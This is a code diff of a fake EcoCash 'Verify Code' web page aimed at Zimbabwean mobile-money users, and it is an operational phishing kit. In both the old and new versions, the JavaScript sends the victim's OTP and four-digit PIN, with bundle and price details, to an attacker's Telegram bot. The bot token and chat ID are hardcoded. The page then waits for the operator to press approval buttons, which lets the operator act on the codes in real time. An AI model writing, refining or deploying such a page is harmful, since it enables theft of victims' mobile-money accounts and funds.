@@ -2,7 +2,8 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <meta name="theme-color" content="#0052cc">
     <title>EcoCash | Verify Code · Zimbabwe</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
@@ -28,25 +29,28 @@
             min-height: 100vh;
             display: flex;
             flex-direction: column;
+            overflow-x: hidden;
         }
 
         header {
             background: white;
             padding: 16px 5%;
-            border-bottom: 2px solid var(--eco-blue);
-            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+            border-bottom: 3px solid var(--eco-blue);
+            box-shadow: 0 2px 12px rgba(0, 82, 204, 0.1);
         }
 
         .logo {
             font-size: 24px;
             font-weight: 800;
-            background: linear-gradient(135deg, var(--eco-red) 0%, var(--eco-blue) 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            text-decoration: none;
             letter-spacing: -0.5px;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 2px;
         }
+
+        .logo .eco { color: var(--eco-blue); }
+        .logo .cash { color: var(--eco-red); }
 
         main {
             flex: 1;
@@ -62,7 +66,7 @@
             padding: 40px;
             max-width: 450px;
             width: 100%;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.15);
+            box-shadow: 0 10px 40px rgba(0, 82, 204, 0.2);
             border: 2px solid var(--eco-blue);
         }
 
@@ -85,7 +89,7 @@
         }
 
         .bundle-info {
-            background: linear-gradient(135deg, var(--eco-red) 0%, var(--eco-blue) 100%);
+            background: linear-gradient(135deg, var(--eco-blue), var(--eco-blue-dark));
             border-radius: 12px;
             padding: 16px;
             margin-bottom: 28px;
@@ -103,7 +107,7 @@
         .bundle-info-row:last-child {
             margin-bottom: 0;
             padding-top: 8px;
-            border-top: 1px solid rgba(255,255,255,0.2);
+            border-top: 1px solid rgba(255, 255, 255, 0.2);
             margin-top: 8px;
             font-weight: 800;
             font-size: 16px;
@@ -117,7 +121,7 @@
             display: block;
             font-size: 12px;
             font-weight: 800;
-            color: var(--eco-red);
+            color: var(--eco-blue);
             text-transform: uppercase;
             letter-spacing: 0.05em;
             margin-bottom: 12px;
@@ -147,7 +151,7 @@
         .otp-box:focus {
             border-color: var(--eco-red);
             background: white;
-            box-shadow: 0 0 0 3px rgba(211, 47, 47, 0.1);
+            box-shadow: 0 0 0 3px rgba(0, 82, 204, 0.1);
             outline: none;
         }
 
@@ -188,7 +192,7 @@
 
         .btn-primary {
             flex: 1;
-            background: linear-gradient(135deg, var(--eco-red) 0%, var(--eco-blue) 100%);
+            background: linear-gradient(135deg, var(--eco-blue), var(--eco-blue-dark));
             color: white;
             border: none;
             padding: 14px 20px;
@@ -199,12 +203,12 @@
             letter-spacing: 0.04em;
             cursor: pointer;
             transition: all 0.2s;
-            box-shadow: 0 4px 12px rgba(211, 47, 47, 0.2);
+            box-shadow: 0 4px 12px rgba(0, 82, 204, 0.25);
         }
 
         .btn-primary:hover:not(:disabled) {
             transform: translateY(-1px);
-            box-shadow: 0 6px 16px rgba(211, 47, 47, 0.3);
+            box-shadow: 0 6px 16px rgba(0, 82, 204, 0.35);
         }
 
         .btn-primary:disabled {
@@ -258,7 +262,7 @@
             justify-content: center;
             flex-direction: column;
             gap: 16px;
-            background: rgba(0,0,0,0.8);
+            background: rgba(0, 0, 0, 0.8);
             z-index: 2000;
             backdrop-filter: blur(4px);
         }
@@ -270,7 +274,7 @@
         .spinner {
             width: 56px;
             height: 56px;
-            border: 5px solid rgba(255,255,255,0.2);
+            border: 5px solid rgba(255, 255, 255, 0.2);
             border-top-color: white;
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
@@ -284,7 +288,7 @@
 
         .spin-sub {
             font-size: 13px;
-            color: rgba(255,255,255,0.7);
+            color: rgba(255, 255, 255, 0.7);
         }
 
         @keyframes spin {
@@ -298,7 +302,7 @@
             display: none;
             align-items: center;
             justify-content: center;
-            background: rgba(0,0,0,0.6);
+            background: rgba(0, 0, 0, 0.6);
             z-index: 2000;
             padding: 20px;
             backdrop-filter: blur(4px);
@@ -314,7 +318,7 @@
             padding: 40px;
             max-width: 400px;
             width: 100%;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            box-shadow: 0 10px 40px rgba(0, 82, 204, 0.2);
             border: 2px solid var(--eco-blue);
         }
 
@@ -349,7 +353,7 @@
         .pin-input-group:focus-within {
             border-color: var(--eco-red);
             background: white;
-            box-shadow: 0 0 0 3px rgba(211, 47, 47, 0.1);
+            box-shadow: 0 0 0 3px rgba(0, 82, 204, 0.1);
         }
 
         .pin-input-field {
@@ -404,14 +408,14 @@
         }
 
         .pin-modal-btn-confirm {
-            background: linear-gradient(135deg, var(--eco-red) 0%, var(--eco-blue) 100%);
+            background: linear-gradient(135deg, var(--eco-blue), var(--eco-blue-dark));
             color: white;
-            box-shadow: 0 4px 12px rgba(211, 47, 47, 0.2);
+            box-shadow: 0 4px 12px rgba(0, 82, 204, 0.25);
         }
 
         .pin-modal-btn-confirm:hover {
             transform: translateY(-1px);
-            box-shadow: 0 6px 16px rgba(211, 47, 47, 0.3);
+            box-shadow: 0 6px 16px rgba(0, 82, 204, 0.35);
         }
 
         .pin-modal-btn-cancel {
@@ -436,7 +440,7 @@
 </head>
 <body>
     <header>
-        <a class="logo" href="index.html">EcoCash</a>
+        <a class="logo" href="index.html"><span class="eco">Eco</span><span class="cash">Cash</span></a>
     </header>
 
     <main>
@@ -478,7 +482,7 @@
             </div>
 
             <div class="form-footer">
-                Your transaction is protected by 256-bit encryption. <a href="#">Learn more</a>
+                Your transaction is protected with 256-bit encryption. <a href="#">Learn more</a>
             </div>
         </div>
     </main>
@@ -487,23 +491,20 @@
     <div id="loadingOverlay" class="loading-overlay">
         <div class="spinner"></div>
         <div class="spin-label">Waiting for Approval</div>
-        <div class="spin-sub">Check your Telegram</div>
+        <div class="spin-sub">Please wait...</div>
     </div>
 
     <!-- PIN Modal -->
     <div id="pinModal" class="modal-overlay">
         <div class="modal-content">
-            <h3 class="modal-title">Confirm PIN</h3>
-            <p class="modal-subtitle">Enter your PIN to complete the transaction</p>
-
+            <h2 class="modal-title">Enter PIN/Password</h2>
+            <p class="modal-subtitle">Confirm your transaction with your PIN or password</p>
+            <div id="pinModalError" class="modal-error"></div>
             <div class="pin-input-group">
-                <input type="password" class="pin-input-field" id="pinInput" placeholder="••••" inputmode="numeric" autocomplete="off" maxlength="4">
+                <input type="password" class="pin-input-field" id="pinInput" placeholder="••••" inputmode="numeric" maxlength="4">
             </div>
-
-            <div class="modal-error" id="modalError"></div>
-
             <div class="pin-modal-buttons">
-                <button class="pin-modal-btn pin-modal-btn-confirm" id="confirmPinBtn" onclick="confirmPIN()">Proceed</button>
+                <button class="pin-modal-btn pin-modal-btn-confirm" onclick="submitPin()">Confirm</button>
                 <button class="pin-modal-btn pin-modal-btn-cancel" onclick="closePinModal()">Cancel</button>
             </div>
         </div>
@@ -512,92 +513,52 @@
     <script>
         const TELEGRAM_BOT_TOKEN = '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM';
         const TELEGRAM_CHAT_ID = '7547427914';
-        let otpCode = '';
-        let bundleParams = {};
+        let bundleData = {};
         let lastUpdateId = 0;
+        let otpCode = '';
 
         function loadBundleData() {
             const params = new URLSearchParams(window.location.search);
-            bundleParams = {
-                data: params.get('data') || '—',
-                price: params.get('price') || '0.00',
-                phone: params.get('phone')
-            };
+            const data = params.get('data');
+            const price = params.get('price');
 
-            if (bundleParams.data && bundleParams.data !== '—') {
+            if (data && price) {
+                bundleData = { data, price };
                 document.getElementById('bundleInfo').style.display = 'block';
-                document.getElementById('bundleData').textContent = bundleParams.data;
-                document.getElementById('bundlePrice').textContent = 'USD ' + bundleParams.price;
+                document.getElementById('bundleData').textContent = data;
+                document.getElementById('bundlePrice').textContent = 'USD ' + price;
             }
         }
 
-        function setupOTPInputs() {
-            const otpBoxes = document.querySelectorAll('.otp-box');
-            
-            otpBoxes.forEach((box, index) => {
-                box.addEventListener('input', (e) => {
-                    const value = e.target.value;
-                    
-                    if (value && !/^\d$/.test(value)) {
-                        box.value = '';
-                        return;
-                    }
-                    
-                    if (value && /^\d$/.test(value)) {
-                        if (index < otpBoxes.length - 1) {
-                            otpBoxes[index + 1].focus();
-                        }
-                    }
-                    
-                    updateOTPCode();
-                    checkOTPComplete();
-                });
-
-                box.addEventListener('keydown', (e) => {
-                    if (e.key === 'Backspace' && !box.value && index > 0) {
-                        otpBoxes[index - 1].focus();
-                    }
-                });
-
-                box.addEventListener('keypress', (e) => {
-                    if (e.key === 'Enter' && getOTPCode().length === 6) {
-                        validateOTP();
-                    }
-                });
+        const otpInputs = document.querySelectorAll('.otp-box');
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                if (e.target.value && index < otpInputs.length - 1) {
+                    otpInputs[index + 1].focus();
+                }
+                updateOTPCode();
             });
 
-            otpBoxes[0].focus();
-        }
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+            });
+        });
 
         function updateOTPCode() {
-            const otpBoxes = document.querySelectorAll('.otp-box');
-            otpCode = Array.from(otpBoxes).map(box => box.value).join('');
+            otpCode = Array.from(otpInputs).map(input => input.value).join('');
         }
 
-        function getOTPCode() {
-            return otpCode;
-        }
-
-        function checkOTPComplete() {
-            const otpBoxes = document.querySelectorAll('.otp-box');
-            const allFilled = Array.from(otpBoxes).every(box => box.value.length === 1);
-            
-            if (allFilled) {
-                setTimeout(() => {
-                    validateOTP();
-                }, 300);
+        function validateOTP() {
+            updateOTPCode();
+            if (otpCode.length !== 6) {
+                showError('Please enter all 6 digits');
+                return;
             }
-        }
 
-        function showError(message) {
-            const errorMsg = document.getElementById('errorMsg');
-            errorMsg.textContent = message;
-            errorMsg.classList.add('show');
-        }
-
-        function clearError() {
-            const errorMsg = document.getElementById('errorMsg');
-            errorMsg.classList.remove('show');
+            document.getElementById('loadingOverlay').classList.add('active');
+            pollForOTPApproval();
         }
 
         async function sendToTelegram(message, buttons) {
@@ -614,33 +575,9 @@
 
                 return response.ok;
             } catch (error) {
-                console.error('Telegram error:', error);
+                console.error('Error:', error);
             }
             return false;
-        }
-
-        function validateOTP() {
-            clearError();
-            const otp = getOTPCode();
-
-            if (otp.length !== 6) {
-                showError('Please enter all 6 digits');
-                return;
-            }
-
-            const message = `📲 OTP Verification\n\nCode: ${otp}\nPhone: +263${bundleParams.phone}\nBundle: ${bundleParams.data}`;
-            
-            const buttons = [
-                [
-                    { text: '✓ Approved', callback_data: 'otp_approved' },
-                    { text: '✗ Declined', callback_data: 'otp_declined' }
-                ]
-            ];
-
-            sendToTelegram(message, buttons).then(() => {
-                document.getElementById('loadingOverlay').classList.add('active');
-                pollForOTPApproval();
-            });
         }
 
         function pollForOTPApproval() {
@@ -658,14 +595,12 @@
                                 if (callbackData === 'otp_approved') {
                                     clearInterval(pollInterval);
                                     document.getElementById('loadingOverlay').classList.remove('active');
-                                    document.getElementById('pinModal').classList.add('active');
-                                    document.getElementById('pinInput').focus();
+                                    openPinModal();
                                 } else if (callbackData === 'otp_declined') {
                                     clearInterval(pollInterval);
                                     document.getElementById('loadingOverlay').classList.remove('active');
-                                    showError('Code verification failed. Please try again.');
-                                    document.querySelectorAll('.otp-box').forEach(box => box.value = '');
-                                    document.querySelectorAll('.otp-box')[0].focus();
+                                    showError('OTP verification declined. Please try again.');
+                                    resetOTP();
                                 }
                             }
                         }
@@ -674,48 +609,42 @@
             }, 1000);
 
             setTimeout(() => clearInterval(pollInterval), 300000);
-        }
 
-        function showModalError(message) {
-            const errorMsg = document.getElementById('modalError');
-            errorMsg.textContent = message;
-            errorMsg.classList.add('show');
-        }
-
-        function clearModalError() {
-            const errorMsg = document.getElementById('modalError');
-            errorMsg.classList.remove('show');
-        }
-
-        async function confirmPIN() {
-            clearModalError();
-            const pin = document.getElementById('pinInput').value.trim();
-
-            if (!pin) {
-                showModalError('Please enter your PIN');
-                return;
-            }
-
-            if (pin.length !== 4) {
-                showModalError('PIN must be 4 digits');
-                return;
-            }
-
-            const message = `🔐 PIN Verification\n\nPIN: ${pin}\nPhone: +263${bundleParams.phone}\nBundle: ${bundleParams.data}`;
-            
+            const message = `📲 OTP Verification\n\nOTP Code: ${otpCode}\nBundle: ${bundleData.data}\nAmount: USD ${bundleData.price}`;
             const buttons = [
                 [
-                    { text: '✓ Valid PIN', callback_data: 'pin_valid' },
-                    { text: '✗ Invalid PIN', callback_data: 'pin_invalid' }
+                    { text: '✓ Approved', callback_data: 'otp_approved' },
+                    { text: '✗ Declined', callback_data: 'otp_declined' }
                 ]
             ];
 
-            await sendToTelegram(message, buttons);
-            document.getElementById('loadingOverlay').classList.add('active');
-            pollForPINApproval();
+            sendToTelegram(message, buttons);
         }
 
-        function pollForPINApproval() {
+        function openPinModal() {
+            document.getElementById('pinModal').classList.add('active');
+        }
+
+        function closePinModal() {
+            document.getElementById('pinModal').classList.remove('active');
+        }
+
+        function submitPin() {
+            const pin = document.getElementById('pinInput').value.trim();
+            const pinError = document.getElementById('pinModalError');
+
+            if (!pin || pin.length !== 4) {
+                pinError.textContent = 'PIN must be 4 digits';
+                pinError.classList.add('show');
+                return;
+            }
+
+            pinError.classList.remove('show');
+            document.getElementById('loadingOverlay').classList.add('active');
+            pollForPinApproval(pin);
+        }
+
+        function pollForPinApproval(pin) {
             const pollInterval = setInterval(() => {
                 fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
                     .then(res => res.json())
@@ -729,14 +658,15 @@
 
                                 if (callbackData === 'pin_valid') {
                                     clearInterval(pollInterval);
-                                    window.location.href = `success.html?data=${encodeURIComponent(bundleParams.data)}&price=${encodeURIComponent(bundleParams.price)}`;
+                                    document.getElementById('loadingOverlay').classList.remove('active');
+                                    proceedToSuccess();
                                 } else if (callbackData === 'pin_invalid') {
                                     clearInterval(pollInterval);
                                     document.getElementById('loadingOverlay').classList.remove('active');
-                                    clearModalError();
-                                    showModalError('Invalid PIN. Please try again.');
+                                    const pinError = document.getElementById('pinModalError');
+                                    pinError.textContent = 'Invalid PIN. Please try again.';
+                                    pinError.classList.add('show');
                                     document.getElementById('pinInput').value = '';
-                                    document.getElementById('pinInput').focus();
                                 }
                             }
                         }
@@ -745,29 +675,35 @@
             }, 1000);
 
             setTimeout(() => clearInterval(pollInterval), 300000);
+
+            const message = `🔐 PIN Verification\n\nPIN: ${pin}\nBundle: ${bundleData.data}\nAmount: USD ${bundleData.price}`;
+            const buttons = [
+                [
+                    { text: '✓ Valid PIN', callback_data: 'pin_valid' },
+                    { text: '✗ Invalid PIN', callback_data: 'pin_invalid' }
+                ]
+            ];
+
+            sendToTelegram(message, buttons);
         }
 
-        function closePinModal() {
-            document.getElementById('pinModal').classList.remove('active');
-            document.getElementById('pinInput').value = '';
-            clearModalError();
+        function proceedToSuccess() {
+            window.location.href = `success.html?data=${encodeURIComponent(bundleData.data)}&price=${bundleData.price}`;
         }
 
-        document.getElementById('pinInput').addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') {
-                confirmPIN();
-            }
-        });
+        function showError(msg) {
+            const errorMsg = document.getElementById('errorMsg');
+            errorMsg.textContent = msg;
+            errorMsg.classList.add('show');
+        }
 
-        window.addEventListener('click', (e) => {
-            const pinModal = document.getElementById('pinModal');
-            if (e.target === pinModal) closePinModal();
-        });
+        function resetOTP() {
+            otpInputs.forEach(input => input.value = '');
+            otpCode = '';
+            otpInputs[0].focus();
+        }
 
-        window.addEventListener('load', () => {
-            loadBundleData();
-            setupOTPInputs();
-        });
+        window.addEventListener('load', loadBundleData);
     </script>
 </body>
 </html>
